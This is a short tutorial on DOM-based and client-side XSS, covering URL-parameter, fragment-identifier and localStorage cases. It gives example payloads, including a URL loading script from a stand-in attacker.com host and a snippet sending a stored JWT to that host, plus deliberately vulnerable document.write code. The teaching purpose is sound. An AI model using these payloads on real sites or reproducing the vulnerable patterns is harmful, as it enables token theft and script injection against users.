Client XSS
==========

DOM based XSS is similar to persistent and reflected XSS's, but with one subtle,
but very important distinction - the malicious JavaScript won't be loaded when
the page loads, instead, the malicious JS executes as a result of treating user
input in an unsafe way.

An easy way to understand this type of vulnerability is to consider pages that
dynamically update content without refreshing the whole page. The technology that
allows for this to happen, is AJAX. And AJAX is essentially JavaScript and XML.

As an example consider the following script used to display ads on a website:
```JavaScript
document.write('<script type="text/JavaScript" src="' + (location.search.split('req=')[1] || '') + '"></scr'+'ipt>');
```

Since the `location.search.split` is not properly escaped, the `req` parameter
can be manipulated by an attacker to retrieve malicious JavaScript from a
third-party domain and inject it into the web page the victim is visiting.
`
http://www.example.com/ads/displayad.html?req=https://www.attacker.com/poc/xss.js
`
To perform this attack, an attacker creates a URL as the one above, and a user
upon clicking it, would execute the contents of the malicious script in their
browser.

There is another type of XSS that take advantage of features that are client-side  
only. This means that through these techniques, no logs are ever recorded on the
server.

A simple example of each feature is presented:

### Fragment identifiers:

The following script is very simple and for demonstration purposes only, but
encompasses the concept.

If this script was on a page:
```html
<script>
x=location.hash.slice(1);
document.write(x)
</script>
```

Then the following URL:
```
http://example.com/fragment.html#<script>alert(1)</script>
```

would trigger a XSS based on the fragment identifier.

### Local Storage

Another feature called `Local Storage` introduced with HTML5 also allows for
DOM based XSS's without the server logging.

`Local Storage` allows application data to be stored locally in the user's browser,
without resorting to cookies. There are several differences from cookies.
It is usually regarded as more secure and more performant than cookies, it also
allows a larger storage limit (5MB).

It should be noted that both `cookies` and `localStorage` are protected from
unrelated domains by the `Same-Origin Policy`.

For our demonstration, the feature we will focus on is the fact that the
data stored with `localStorage` is never sent to the server.
This is what allows the DOM-XSS to be performed without logs on the server-side.

A simple example:
```html
<script>
//Save our sample data
localStorage.setItem("JWT", "JWTTOKEN");

document.write("new Image().src='http://www.attacker.com?token="+localStorage.getItem('JWT')+"'>");
</script>
```

An important security detail to keep in mind is that the `localStorage` object
stores the data without an expiration date. This means that the data will not be
deleted when the browser is closed.